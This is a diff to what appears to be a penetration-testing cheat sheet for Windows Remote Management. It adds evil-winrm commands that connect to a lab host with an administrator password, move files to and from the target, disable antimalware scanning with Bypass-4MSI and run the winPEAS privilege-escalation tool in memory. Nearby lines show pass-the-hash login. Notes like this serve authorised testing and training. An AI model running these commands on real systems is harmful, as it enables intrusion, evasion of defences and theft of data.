@@ -588,6 +588,15 @@ nmap -p5985,5986 <IP>
 evil-winrm -i <IP> -u user -p pass
 evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open
 
+#inside evil-winrm, we can download n upload
+download notes.txt /root/raj/notes.txt
+upload /root/notes.txt .
+#run winpeas from kali folder /opt/privsc
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
+Bypass-4MSI
+menu
+Invoke-Binary /opt/privsc/winPEASx64.exe
+
 ##Login with Hash
 evil-winrm -i <IP> -u user -H ntlmhash
 
